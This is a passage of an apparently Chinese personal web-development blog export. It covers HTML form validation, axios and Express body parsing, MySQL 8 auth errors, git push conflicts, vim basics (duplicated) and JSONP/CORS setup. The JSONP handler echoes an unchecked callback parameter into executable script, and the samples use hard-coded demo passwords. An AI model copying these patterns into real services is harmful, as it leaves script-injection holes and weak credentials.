ValidityState.tooShort：布尔值，表示用户输入的字符少于最短字数。 ValidityState.typeMismatch：布尔值，表示用户填入的值不符合类型要求（主要是类型为 Email 或 URL 的情况）。 ValidityState.valid：布尔值，表示用户是否满足所有校验条件。 ValidityState.valueMissing：布尔值，表示用户没有填入必填的值。 下面是一个例子。 123456var input = document.getElementById(&#x27;myinput&#x27;);if (input.validity.valid) &#123; console.log(&#x27;通过校验&#x27;);&#125; else &#123; console.log(&#x27;校验失败&#x27;);&#125; 下面是另外一个例子。 12345var txt = &#x27;&#x27;;if (document.getElementById(&#x27;myInput&#x27;).validity.rangeOverflow) &#123; txt = &#x27;数值超过上限&#x27;;&#125;document.getElementById(&#x27;prompt&#x27;).innerHTML = txt; 如果想禁止浏览器弹出表单验证的报错信息，可以监听invalid事件。 123456789101112131415161718192021222324var input = document.getElementById(&#x27;username&#x27;);var form = document.getElementById(&#x27;form&#x27;);var elem = document.createElement(&#x27;div&#x27;);elem.id = &#x27;notify&#x27;;elem.style.display = &#x27;none&#x27;;form.appendChild(elem);input.addEventListener(&#x27;invalid&#x27;, function (event) &#123; event.preventDefault(); if (!event.target.validity.valid) &#123; elem.textContent = &#x27;用户名必须是小写字母&#x27;; elem.className = &#x27;error&#x27;; elem.style.display = &#x27;block&#x27;; input.className = &#x27;invalid animated shake&#x27;; &#125;&#125;);input.addEventListener(&#x27;input&#x27;, function(event)&#123; if ( &#x27;block&#x27; === elem.style.display ) &#123; input.className = &#x27;&#x27;; elem.style.display = &#x27;none&#x27;; &#125;&#125;); 上面代码中，一旦发生invalid事件（表单验证失败），event.preventDefault()用来禁止浏览器弹出默认的验证失败提示，然后设置定制的报错提示框。 表单的 novalidate 属性表单元素的 HTML 属性novalidate，可以关闭浏览器的自动校验。 12&lt;form novalidate&gt;&lt;/form&gt; 这个属性也可以在脚本里设置。 1form.noValidate = true; 如果表单元素没有设置novalidate属性，那么提交按钮（&lt;button&gt;或&lt;input&gt;元素）的formnovalidate属性也有同样的作用。 123&lt;form&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; formnovalidate&gt;&lt;/form&gt; enctype 属性表单能够用四种编码，向服务器发送数据。编码格式由表单的enctype属性决定。 假定表单有两个字段，分别是foo和baz，其中foo字段的值等于bar，baz字段的值是一个分为两行的字符串。 12The first line.The second line. 下面四种格式，都可以将这个表单发送到服务器。 （1）GET 方法 如果表单使用GET方法发送数据，enctype属性无效。 123456&lt;form action=&quot;register.php&quot; method=&quot;get&quot; onsubmit=&quot;AJAXSubmit(this); return false;&quot;&gt;&lt;/form&gt; 数据将以 URL 的查询字符串发出。 1?foo=bar&amp;baz=The%20first%20line.%0AThe%20second%20line. （2）application/x-www-form-urlencoded 如果表单用POST方法发送数据，并省略enctype属性，那么数据以application/x-www-form-urlencoded格式发送（因为这是默认值）。 123456&lt;form action=&quot;register.php&quot; method=&quot;post&quot; onsubmit=&quot;AJAXSubmit(this); return false;&quot;&gt;&lt;/form&gt; 发送的 HTTP 请求如下。 123Content-Type: application/x-www-form-urlencodedfoo=bar&amp;baz=The+first+line.%0D%0AThe+second+line.%0D%0A 上面代码中，数据体里面的%0D%0A代表换行符（\\r\\n）。 （3）text/plain 如果表单使用POST方法发送数据，enctype属性为text/plain，那么数据将以纯文本格式发送。 1234567&lt;form action=&quot;register.php&quot; method=&quot;post&quot; enctype=&quot;text/plain&quot; onsubmit=&quot;AJAXSubmit(this); return false;&quot;&gt;&lt;/form&gt; 发送的 HTTP 请求如下。 12345Content-Type: text/plainfoo=barbaz=The first line.The second line. （4）multipart/form-data 如果表单使用POST方法，enctype属性为multipart/form-data，那么数据将以混合的格式发送。 1234567&lt;form action=&quot;register.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; onsubmit=&quot;AJAXSubmit(this); return false;&quot;&gt;&lt;/form&gt; 发送的 HTTP 请求如下。 12345678910111213Content-Type: multipart/form-data; boundary=---------------------------314911788813839-----------------------------314911788813839Content-Disposition: form-data; name=&quot;foo&quot;bar-----------------------------314911788813839Content-Disposition: form-data; name=&quot;baz&quot;The first line.The second line.-----------------------------314911788813839-- 这种格式也是文件上传的格式。 文件上传用户上传文件，也是通过表单。具体来说，就是通过文件输入框选择本地文件，提交表单的时候，浏览器就会把这个文件发送到服务器。 1&lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;myFile&quot;&gt; 此外，还需要将表单&lt;form&gt;元素的method属性设为POST，enctype属性设为multipart/form-data。其中，enctype属性决定了 HTTP 头信息的Content-Type字段的值，默认情况下这个字段的值是application/x-www-form-urlencoded，但是文件上传的时候要改成multipart/form-data。 123456789&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;div&gt; &lt;label for=&quot;file&quot;&gt;选择一个文件&lt;/label&gt; &lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;myFile&quot; multiple&gt; &lt;/div&gt; &lt;div&gt; &lt;input type=&quot;submit&quot; id=&quot;submit&quot; name=&quot;submit_button&quot; value=&quot;上传&quot; /&gt; &lt;/div&gt;&lt;/form&gt; 上面的 HTML 代码中，file 控件的multiple属性，指定可以一次选择多个文件；如果没有这个属性，则一次只能选择一个文件。 12var fileSelect = document.getElementById(&#x27;file&#x27;);var files = fileSelect.files; 然后，新建一个 FormData 实例对象，模拟发送到服务器的表单数据，把选中的文件添加到这个对象上面。 123456789101112var formData = new FormData();for (var i = 0; i &lt; files.length; i++) &#123; var file = files[i]; // 只上传图片文件 if (!file.type.match(&#x27;image.*&#x27;)) &#123; continue; &#125; formData.append(&#x27;photos[]&#x27;, file, file.name);&#125; 最后，使用 Ajax 向服务器上传文件。 1234567891011var xhr = new XMLHttpRequest();xhr.open(&#x27;POST&#x27;, &#x27;handler.php&#x27;, true);xhr.onload = function () &#123; if (xhr.status !== 200) &#123; console.log(&#x27;An error occurred!&#x27;); &#125;&#125;;xhr.send(formData); 除了发送 FormData 实例，也可以直接 AJAX 发送文件。 123456var file = document.getElementById(&#x27;test-input&#x27;).files[0];var xhr = new XMLHttpRequest();xhr.open(&#x27;POST&#x27;, &#x27;myserver/uploads&#x27;);xhr.setRequestHeader(&#x27;Content-Type&#x27;, file.type);xhr.send(file); 参考链接 HTML5 Form Validation With the “pattern” Attribute, Thoriq Firdaus","categories":[{"name":"HTML","slug":"HTML","permalink":"https://coloey.github.io/categories/HTML/"}],"tags":[]},{"title":"axios发送请求时后台接收的req.body为空","slug":"axios发送请求时后台接收的req-body为空","date":"2022-03-21T01:47:50.000Z","updated":"2022-03-21T03:12:20.438Z","comments":true,"path":"2022/03/21/axios发送请求时后台接收的req-body为空/","link":"","permalink":"https://coloey.github.io/2022/03/21/axios%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E6%97%B6%E5%90%8E%E5%8F%B0%E6%8E%A5%E6%94%B6%E7%9A%84req-body%E4%B8%BA%E7%A9%BA/","excerpt":"","text":"首先，先了解一下关于http协议里定义的四种常见数据的post方法，分别是：application/www-form-ulrencodedmultipart/form-dataapplication/jsontext/xml Express依赖bodyParser对请求的包体进行解析。默认支持application/json,application/www-form-urlencoded,multipart/form-data.单数对xml没有支持。需要自己代码来实现 用axios post请求提交数据的时候需要清楚发送请求的类型是哪种，后台用相应的方法解析 1 使用FormData提交表单数据 坑一：使用FormData时一定要在先绑定submit事件，在submit事件触发时发送axios post请求,否则获取不到formData里面的值 坑二:axios请求里面如果直接使用data:formData，浏览器会自动帮我们加上 Content-Type: multipart/form-data ，因此请求要这样设置： 123456789101112131415var form = document.getElementById(&quot;myForm&quot;); // 用表单来初始化 var formData = new FormData(form); // 我们可以根据name来访问表单中的字段 var username = formData.get(&quot;username&quot;); // 获取名字 var password = formData.get(&quot;password&quot;); // 获取密码 axios(&#123; method:&quot;post&quot;, url:&#x27;http://127.0.0.1/api/login&#x27;, data:&#123; username:username, password:password &#125; &#125;) 这样默认Content-type：application/json, 如果表单属性过多，可以先用一个对象接收： 123456789101112131415var form = document.getElementById(&quot;myForm&quot;); // 用表单来初始化 var formData = new FormData(form); // 我们可以根据name来访问表单中的字段 let myFormData=&#123;&#125;; //如果表单属性过多可以先遍历 for(let pair of formData.entries())&#123; myFormData[pair[0]]=pair[1]; &#125; axios(&#123; method:&quot;post&quot;, url:&#x27;http://127.0.0.1/api/login&#x27;, data:myFormData &#125;) 后台接收使用中间件body-parser解析表单体数据 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960const express=require(&#x27;express&#x27;);const session=require(&#x27;express-session&#x27;);const cors=require(&#x27;cors&#x27;);const bodyParser=require(&#x27;body-parser&#x27;)const app=express();app.use(cors());app.use( session(&#123; secret:&#x27;xiaoqi&#x27;, resave:false, saveUninitialized:true &#125;))//托管静态页面app.use(express.static(&#x27;./pages&#x27;));//自定义解析Post提交过来的表单数据app.use(bodyParser.urlencoded(&#123;extended:false&#125;))app.use(bodyParser.json())//登录API接口app.post(&#x27;/api/login&#x27;,(req,res)=&gt;&#123; //判断用户提交的登录信息是否正确 //console.log(req.body) if(req.body.username!==&quot;admin&quot;||req.body.password!==&quot;888888&quot;)&#123; return res.send(&#123;status:1,msg:&#x27;登录失败&#x27;&#125;) &#125; //登录成功则把信息存储在Session中 console.log(req.body); req.session.user=req.body;//用户登录信息 req.session.islogin=true;//用户登录状态 res.send(&#123;status:0,msg:&#x27;登录成功&#x27;&#125;)&#125;)//获取用户姓名的接口app.get(&#x27;/api/username&#x27;,(req,res)=&gt;&#123; //从Session中获取用户姓名响应给客户端 if(!req.session.islogin)&#123; return res.send(&#123;status:1,msg:&#x27;fail&#x27;&#125;) &#125; res.send(&#123; status:0, msg:&#x27;success&#x27;, username:req.session.user.username, &#125;)&#125;)//退出登录的接口app.post(&#x27;/api/logout&#x27;,(req,res)=&gt;&#123; //清空当前客户端的session信息 req.session.destroy() res.send(&#123; status:0, msg:&#x27;退出登录成功&#x27; &#125;)&#125;)app.listen(80,()=&gt;&#123; console.log(&#x27;运行在http://127.0.0.1&#x27;)&#125;)","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"}],"tags":[]},{"title":"node连接MySql报错ER_NOT_SUPPORTED_AUTH_MODE","slug":"node连接MySql报错ER-NOT-SUPPORTED-AUTH-MODE","date":"2022-03-20T05:28:16.000Z","updated":"2022-03-20T05:33:56.881Z","comments":true,"path":"2022/03/20/node连接MySql报错ER-NOT-SUPPORTED-AUTH-MODE/","link":"","permalink":"https://coloey.github.io/2022/03/20/node%E8%BF%9E%E6%8E%A5MySql%E6%8A%A5%E9%94%99ER-NOT-SUPPORTED-AUTH-MODE/","excerpt":"","text":"报错信息本人系统安装的是mysql-installer-community-8.0.18.0.msi这个版本，然后我本地使用node-mysql去连接数据库。 123456789101112131415const mysql=require(&#x27;mysql&#x27;)//建立MYSQL与数据库的联系const db=mysql.createPool(&#123; host:&#x27;127.0.0.1&#x27;,//数据库的ip地址 user:&#x27;root&#x27;, password:&#x27;123456&#x27;, database:&#x27;my_db_01&#x27;,//指定要操作哪个数据库&#125;)//测试mysql能否正常工作db.query(&#x27;select 1&#x27;,(err,result)=&gt;&#123; //mysql工作期间报错 if(err)return console.log(err.message) //能成功执行SQL语句 console.log(result);&#125;) 运行db.js 12PS D:\\Vue-chat\\Server&gt; node db.jsER_NOT_SUPPORTED_AUTH_MODE: Client does not support authentication protocol requested by server; consider upgrading MySQL client 报错原因mysql8.0以上加密方式，Node还不支持。 解决第一步谷歌查到了 https://stackoverflow.com/questions/50093144/mysql-8-0-client-does-not-support-authentication-protocol-requested-by-server这个答案，和我报错的步骤基本一样，按照这个进行操作，登录MySql Command Line Client使用这个 12345mysql&gt; alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified with mysql_native_password by &#x27;123456&#x27;;Query OK, 0 rows affected (0.27 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.08 sec)","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"}],"tags":[]},{"title":"git遇到的坑","slug":"git遇到的坑","date":"2022-03-18T13:44:59.000Z","updated":"2022-03-18T13:45:30.601Z","comments":true,"path":"2022/03/18/git遇到的坑/","link":"","permalink":"https://coloey.github.io/2022/03/18/git%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/","excerpt":"","text":"解决用git push origin master时出现的问题不知道小伙伴们在使用git push origin master时有没有遇到下面的问题，今天我遇到了，原因一般是相同的，下面详细分析一下 报错内容：To github.com:/! [rejected] master -&gt; master (non-fast-forward)error: failed to push some refs to ‘&#103;&#105;&#x74;&#64;&#x67;&#105;&#116;&#x68;&#x75;&#x62;&#x2e;&#99;&#x6f;&#x6d;:***/***’hint: Updates were rejected because the tip of your current branch is behindhint: its remote counterpart. Integrate the remote changes (e.g.hint: ‘git pull …’) before pushing again.hint: See the ‘Note about fast-forwards’ in ‘git push –help’ for details. 大致翻译为：错误：无法将一些引用推送到’&#103;&#x69;&#x74;&#64;&#103;&#105;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#x6f;&#x6d;：****** / Demo.git’提示：由于当前分支的尖端位于其远程对应的后面，因此更新被拒绝。 合并远程更改（例如’git pull’），然后再次推送。 有关详细信息，请参见“ git push –help”中的“关于fast-forwards的注意事项”。 这个报错的原因是因为远程repository和本地的repository有冲突，下面有3种解决办法： 按上面报错内容中所给的提示先用git pull之后再用git push$ git pull origin master$ git push origin master 使用强制push的方法，但是这会使远程修改丢失，一般是不可取的，尤其是多人协作开发的时候$ git push origin master -f 如果不想merge远程和本地修改，可以先创建新的分支，然后再push$ git branch [name]$ git push origin [name]","categories":[{"name":"git","slug":"git","permalink":"https://coloey.github.io/categories/git/"}],"tags":[]},{"title":"vim","slug":"vim","date":"2022-03-18T13:42:38.000Z","updated":"2022-03-18T13:43:36.735Z","comments":true,"path":"2022/03/18/vim/","link":"","permalink":"https://coloey.github.io/2022/03/18/vim/","excerpt":"","text":"Vim可以分为三种模式，分别为： 命令行模式（Command mode） 插入模式（Insert mode） 底行模式（Lastline mode） 命令行模式 控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到 last line mode。 插入模式 只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。 底行模式 将文件保存或退出vim，也可以设置编辑环境，如寻找字符串、列出行号……等。 不过，一般我们在使用时把vi简化成两个模式，就是将底行模式（last line mode）也算入命令行模式command mode）。 5. Vim的基本操作a) 进入Vim 在系统光标提示符后，输入vim及文件名后，回车，进入Vim编辑画面。 特别注意，进入vim之后，是处于「命令行模式（command mode）」，要切换到「插入模式（Insert mode）」才能够输入文字。 b) 切换至插入模式（Insert mode）编辑文件 在「命令行模式（command mode）」下按一下字母「i」就可以进入「插入模式（Insert mode）」，这时候你就可以开始输入文字了。 c) 插入模式（Insert mode）切换到命令行模式（Command mode） 在插入模式下，按一下「ESC」键即可。 d) 退出vim及保存文件 在命令行模式（Command mode）下，按冒号「:」键，进入底行模式（Last Line mode） 常见底行模式下的命令行： :w filename 文件以filename为文件名保存 :wq 文件存盘并退出vim :q 文件不存盘并退出vim :q! 文件不存盘强制退出vim 6. 命令行模式下的功能键（部分）a) 从命令行模式切换为插入模式的三种方式 「 i 」：从当前光标位置进入插入模式 「 a 」：从当前光标位置的下一个字符进入插入模式 「 o 」：从当前光标位置的下一行进入插入模式 b) 从插入模式切换为命令行模式 按「ESC」键 c) 移动光标 vi可以直接用键盘上的光标来上下左右移动，但正规的vi是用小写英文字母「h」、「j」、「k」、「l」，分别控制光标左、下、上、右移一格。 d) 行尾追加 不管光标在该行的什么位置，直接按大写字母「A」即可 e) 删除单词 dw：把光标停留在需要删除的单词前面，依次按下「d」「w」，即可 de：把光标停留在需要删除的单词前面（无视单词前面的空格），依次按下「d」「e」，即可 f) 从当前光标处删除到行末 把光标停留在需要删除的句子前面，依次按下「d」「$」，即可 g) 快速跳转到行首 按下数字「0」，即可 h) 使用计数以删除单词 示例：this ABC DE line FGHI JK LMN OP of words is Q RS TUV cleaned up. 依次将鼠标定位到ABC前，按「d」「2」「w」，可以删除：ABC DE 将鼠标定位到FGHI前，按「d」「4」「w」，可以删除：FGHI JK LMN OP 将鼠标定位到Q前，按「d」「3」「w」，可以删除：Q RS TUV 得到句子： this line of words is cleaned up. i) 删除当前行 鉴于删除当前行这一操作的高频性，vim设计者简化了快捷键，按「d」「d」即可。 连续删除两行，从当前行开始，则为：「2」「d」「d」 j) 撤销更改 a. 按小写字母「u」，撤销上一步的更改操作； b. 按大写字母「U」，撤销整行的更改操作； c. 「Ctrl+R」撤销上一步「撤销操作」。 k) 将刚删除的内容置入其他行 之前刚刚删除的内容，会放入Vim编辑器的寄存器中。基于如此原理，可以将之认为成Windows操作系统的「剪切」操作。 先在想删除的行，按「d」「d」，进行删除操作； 再在想插入那行的前一行按「p」键即可。 l) 替换 将光标放到需要改的字符前，先按「r」键，再输入想更改的字符即可。 m) 跳转 顶部跳转命令：先按「Control」+「g」键，在终端底部调出一栏，然后输入「g」「g」即可； 底部跳转命令：先按「Control」+「g」键，在终端底部调出一栏，然后输入大写字母「g」即可； 特定行跳转命令：直接输入行号，然后输入大写字母「g」即可。 n) 查找命令 字符串查找： 输入英文斜杠「/」，后面紧接需要搜索的字符串即可。 查找下一个相同字符串，就紧接着按小写字母「n」； 查找上一个相同字符串，就紧接着按大写字母「N」。 配对括号查找： 在编程语言里，配对括号「 ( 」「 ) 」「 { 」「 } 」很常见，当定位到一个配对括号的一半时（注意光标要定位在该括号之前），按「%」，即可自动跳转到与之匹配的第一个配对括号处。 o) 替换字符串 当前行替换命令 在标准命令行模式下，光标定位到当前行，按英文冒号「 ：」，再输入s/oldstring/newstring/g 回车，即可。 完整语句为： :s/dogg/dog/g 特定几行替换命令 在标准命令行模式下，按英文冒号「 ：」，再输入#,#s/oldstring/newstring/g 回车，即可（其中#代表特定的首尾两行的行号）。 完整语句为： ***:*5,8s/dogg/dog/g 全文替换命令 在标准命令行模式下，按英文冒号「 ：」，再输入%s/oldstring/newstring/g 回车，即可（其中#代表特定的首尾两行的行号）。 完整语句为： *:*%s/dogg/dog/g 全文替换命令（每个匹配项替换前需确认） 在标准命令行模式下，按英文冒号「 ：」，再输入%s/oldstring/newstring/gc 回车，即可（其中#代表特定的首尾两行的行号）。 完整语句为： *:*%s/dogg/dog/gc 作者：饥人谷_李维超链接：https://www.jianshu.com/p/8b679b35c9d5来源：简书著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。Vim可以分为三种模式，分别为： 命令行模式（Command mode） 插入模式（Insert mode） 底行模式（Lastline mode） 命令行模式 控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到 last line mode。 插入模式 只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。 底行模式 将文件保存或退出vim，也可以设置编辑环境，如寻找字符串、列出行号……等。 不过，一般我们在使用时把vi简化成两个模式，就是将底行模式（last line mode）也算入命令行模式command mode）。 5. Vim的基本操作a) 进入Vim 在系统光标提示符后，输入vim及文件名后，回车，进入Vim编辑画面。 特别注意，进入vim之后，是处于「命令行模式（command mode）」，要切换到「插入模式（Insert mode）」才能够输入文字。 b) 切换至插入模式（Insert mode）编辑文件 在「命令行模式（command mode）」下按一下字母「i」就可以进入「插入模式（Insert mode）」，这时候你就可以开始输入文字了。 c) 插入模式（Insert mode）切换到命令行模式（Command mode） 在插入模式下，按一下「ESC」键即可。 d) 退出vim及保存文件 在命令行模式（Command mode）下，按冒号「:」键，进入底行模式（Last Line mode） 常见底行模式下的命令行： :w filename 文件以filename为文件名保存 :wq 文件存盘并退出vim :q 文件不存盘并退出vim :q! 文件不存盘强制退出vim 6. 命令行模式下的功能键（部分）a) 从命令行模式切换为插入模式的三种方式 「 i 」：从当前光标位置进入插入模式 「 a 」：从当前光标位置的下一个字符进入插入模式 「 o 」：从当前光标位置的下一行进入插入模式 b) 从插入模式切换为命令行模式 按「ESC」键 c) 移动光标 vi可以直接用键盘上的光标来上下左右移动，但正规的vi是用小写英文字母「h」、「j」、「k」、「l」，分别控制光标左、下、上、右移一格。 d) 行尾追加 不管光标在该行的什么位置，直接按大写字母「A」即可 e) 删除单词 dw：把光标停留在需要删除的单词前面，依次按下「d」「w」，即可 de：把光标停留在需要删除的单词前面（无视单词前面的空格），依次按下「d」「e」，即可 f) 从当前光标处删除到行末 把光标停留在需要删除的句子前面，依次按下「d」「$」，即可 g) 快速跳转到行首 按下数字「0」，即可 h) 使用计数以删除单词 示例：this ABC DE line FGHI JK LMN OP of words is Q RS TUV cleaned up. 依次将鼠标定位到ABC前，按「d」「2」「w」，可以删除：ABC DE 将鼠标定位到FGHI前，按「d」「4」「w」，可以删除：FGHI JK LMN OP 将鼠标定位到Q前，按「d」「3」「w」，可以删除：Q RS TUV 得到句子： this line of words is cleaned up. i) 删除当前行 鉴于删除当前行这一操作的高频性，vim设计者简化了快捷键，按「d」「d」即可。 连续删除两行，从当前行开始，则为：「2」「d」「d」 j) 撤销更改 a. 按小写字母「u」，撤销上一步的更改操作； b. 按大写字母「U」，撤销整行的更改操作； c. 「Ctrl+R」撤销上一步「撤销操作」。 k) 将刚删除的内容置入其他行 之前刚刚删除的内容，会放入Vim编辑器的寄存器中。基于如此原理，可以将之认为成Windows操作系统的「剪切」操作。 先在想删除的行，按「d」「d」，进行删除操作； 再在想插入那行的前一行按「p」键即可。 l) 替换 将光标放到需要改的字符前，先按「r」键，再输入想更改的字符即可。 m) 跳转 顶部跳转命令：先按「Control」+「g」键，在终端底部调出一栏，然后输入「g」「g」即可； 底部跳转命令：先按「Control」+「g」键，在终端底部调出一栏，然后输入大写字母「g」即可； 特定行跳转命令：直接输入行号，然后输入大写字母「g」即可。 n) 查找命令 字符串查找： 输入英文斜杠「/」，后面紧接需要搜索的字符串即可。 查找下一个相同字符串，就紧接着按小写字母「n」； 查找上一个相同字符串，就紧接着按大写字母「N」。 配对括号查找： 在编程语言里，配对括号「 ( 」「 ) 」「 { 」「 } 」很常见，当定位到一个配对括号的一半时（注意光标要定位在该括号之前），按「%」，即可自动跳转到与之匹配的第一个配对括号处。 o) 替换字符串 当前行替换命令 在标准命令行模式下，光标定位到当前行，按英文冒号「 ：」，再输入s/oldstring/newstring/g 回车，即可。 完整语句为： :s/dogg/dog/g 特定几行替换命令 在标准命令行模式下，按英文冒号「 ：」，再输入#,#s/oldstring/newstring/g 回车，即可（其中#代表特定的首尾两行的行号）。 完整语句为： ***:*5,8s/dogg/dog/g 全文替换命令 在标准命令行模式下，按英文冒号「 ：」，再输入%s/oldstring/newstring/g 回车，即可（其中#代表特定的首尾两行的行号）。 完整语句为： *:*%s/dogg/dog/g 全文替换命令（每个匹配项替换前需确认） 在标准命令行模式下，按英文冒号「 ：」，再输入%s/oldstring/newstring/gc 回车，即可（其中#代表特定的首尾两行的行号）。 完整语句为： *:*%s/dogg/dog/gc","categories":[{"name":"vim","slug":"vim","permalink":"https://coloey.github.io/categories/vim/"}],"tags":[]},{"title":"JSONP解决跨域问题","slug":"JSONP解决跨域问题","date":"2022-03-14T09:46:33.000Z","updated":"2022-04-19T08:13:24.597Z","comments":true,"path":"2022/03/14/JSONP解决跨域问题/","link":"","permalink":"https://coloey.github.io/2022/03/14/JSONP%E8%A7%A3%E5%86%B3%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98/","excerpt":"","text":"概念：浏览器通过script标签的src属性，请求服务器上的数据，同时服务器返回一个函数的调用，这种请求数据的方式叫做JSONP 如果项目中已经配置了CORS跨域资源共享，为防止冲突,必须在配置CORS中间件之前声明JSONP的接口，否则JSONP接口会被处理成开启了CORS的接口 123456789101112131415161718192021222324252627const express=require(&#x27;express&#x27;)//创建web服务器const app=express()//导入路由模块const apirouter=require(&#x27;./apirouter&#x27;)//在配置cors中间件之前定义JSONP的接口app.get(&#x27;/api/jsonp&#x27;,(req,res)=&gt;&#123; //1 得到客户端请求的回调函数名称 const funcName=req.query.callback //2 定义发送到客户端的JSON格式数据对象 const data=&#123;name:&#x27;zs&#x27;,age:20&#125; //3 拼接一个函数调用的字符串 const scriptStr=`$&#123;funcName&#125;($&#123;JSON.stringify(data)&#125;)` //4 把拼接的字符串响应给客户端的&lt;script&gt;标签进行解析执行 res.send(scriptStr)&#125;)app.use(express.urlencoded(&#123;extended:false&#125;))//在路由之前配置cors中间件const cors=require(&#x27;cors&#x27;)app.use(cors())//将路由模块注册为全局中间件app.use(&#x27;/api&#x27;,apirouter)app.listen(80,()=&gt;&#123; console.log(&#x27;运行在http://127.0.0.1&#x27;)&#125;) 发请求：HTML 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script src=&quot;https://cdn.staticfile.org/jquery/1.10.0/jquery.min.js&quot;&gt; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;button id=&quot;btnJsonp&quot;&gt;Jsonp&lt;/button&gt; &lt;script&gt; $(&#x27;#btnJsonp&#x27;).on(&#x27;click&#x27;,function()&#123; $.ajax(&#123; type:&#x27;GET&#x27;, url:&#x27;http://127.0.0.1/api/jsonp&#x27;, dataType:&#x27;jsonp&#x27;, success:function(res)&#123; console.log(res) &#125; &#125;) &#125;) &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; JSONP调用是通过动态创建script元素并为src属性指定跨域URL实现的，此时script和img元素类似，能够不受限制地从其他域加载资源，因为JSONP是有效的JavaScript,所以JSONP响应在被加载完成之后会立即执行，比如以上例子中，服务器返回了带有src的script标签，客户端·收到响应后，就会去请求http://127.0.0.1/api/jsonp?callback(data)数据 缺点： JSONP是从不同域拉取可执行代码，如果这个域不可信，则可能在响应中加入恶意内容 不好确定JSONP请求是否失败，虽然HTML5规定了script元素的onerror时间处理程序，但还没有被任何浏览器实现，为此，开发者经常需要使用计时器决定是否放弃等待响应","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"},{"name":"Express","slug":"Node/Express","permalink":"https://coloey.github.io/categories/Node/Express/"}],"tags":[]},{"title":"基于cors解决跨域问题","slug":"基于cors解决跨域问题","date":"2022-03-14T06:29:06.000Z","updated":"2022-03-14T09:13:22.067Z","comments":true,"path":"2022/03/14/基于cors解决跨域问题/","link":"","permalink":"https://coloey.github.io/2022/03/14/%E5%9F%BA%E4%BA%8Ecors%E8%A7%A3%E5%86%B3%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98/","excerpt":"","text":"123456789101112131415161718192021222324252627282930apirouter.js:const express=require(&#x27;express&#x27;)//创建web服务器实例const router=express.Router()//挂载对应路由router.get(&#x27;/get&#x27;,(req,res)=&gt;&#123; res.send(&#123; status:0,//0表示成功，1表示失败 msg:&#x27;Get请求成功&#x27;, data:req.query &#125;)&#125;)//定义post接口router.post(&#x27;/post&#x27;,(req,res)=&gt;&#123; res.send(&#123; status:0,//0表示成功，1表示失败 msg:&#x27;Post请求成功&#x27;, data:req.body &#125;)&#125;)//定义delete接口router.delete(&#x27;/delete&#x27;,(req,res)=&gt;&#123; res.send(&#123; status:0,//0表示成功，1表示失败 msg:&#x27;Delete请求成功&#x27;, &#125;)&#125;)module.exports=router Get ,Post,Delete接口 123456789101112131415const express=require(&#x27;express&#x27;)//创建web服务器const app=express()//导入路由模块const apirouter=require(&#x27;./apirouter&#x27;)app.use(express.urlencoded(&#123;extended:false&#125;))//在路由之前配置cors中间件,解决跨域问题const cors=require(&#x27;cors&#x27;)app.use(cors())//将路由模块注册为全局中间件app.use(&#x27;/api&#x27;,apirouter)app.listen(80,()=&gt;&#123; console.log(&#x27;运行在http://127.0.0.1&#x27;)&#125;) 解决接口跨域问题CORS(主流方案) JSONP（有缺陷：只支持Get请求） 什么是CORSCORS(Cross-Origin Resource Sharing,跨域资源共享)，由一系列Http响应头组成，这些Http响应头决定浏览器是否阻止前端JS代码跨域获取资源。 浏览器的同源安全策略默认会阻止网页“跨域”获取资源，但如果接口服务器配置了CORS相关的HTTP响应头，就可以解决浏览器端的跨域访问限制。 浏览器：网页==》跨域请求 接口服务器（配置Access-Control-Allow-*相关响应头） ​ 《== 响应 CORS响应头部Access-Control-Allow-Origin响应头部可以携带一个Access-Control-Allow-Origin字段，语法如下： Access-Control-Allow-Origin:|* 其中origin参数指定了允许访问该资源的外域URL 例如：下面字段只允许访问来自http://itcast.cn的请求 res.setHeader(‘Access-Control-Allow-Origin’,’http://itcast.cn&#39;) *通配符表示允许来自任何域的请求 Access-Control-Allow-Headers默认情况下，CORS仅支持客户端向服务器发送9个请求头： Accept,Accept-Language,Content-Language,DPR,Downlink,Save-Data,Viewport-Width,Width,Content-Type(仅限于text-plain,multipart/form-data,application/x-www-form-urlencoded三者之一) 如果向服务器发送了额外的请求头信息，则需要在服务器端，通过Access-Control-Allow-Headers对额外的请求头进行声明，否则这次请求会失败 例如，允许客户端向服务器发送Content-Type请求头和X-Custom-Header请求头 res.setHeader(‘Access-Control-Allow-Header’,’Content-Type’,’X-Custom-Header’) Access-Control-Allow-Methods 默认情况下，CORS仅支持客户端发起GET,POST,HEAD请求。如果客户端希望通过PUT,DELETE等方式请求服务器的资源，则需要在服务器端，通过Access-Control-Allow-Methods来指明实际请求所允许的HTTP方法 123res.setHeader(&#x27;Access-Control-Allow-Methods&#x27;,&#x27;POST,GET,DELETE,HEAD&#x27;)//允许所有HTTP请求方法res.setHeader(&#x27;Access-Control-Allow-Methods&#x27;,&#x27;*&#x27;) 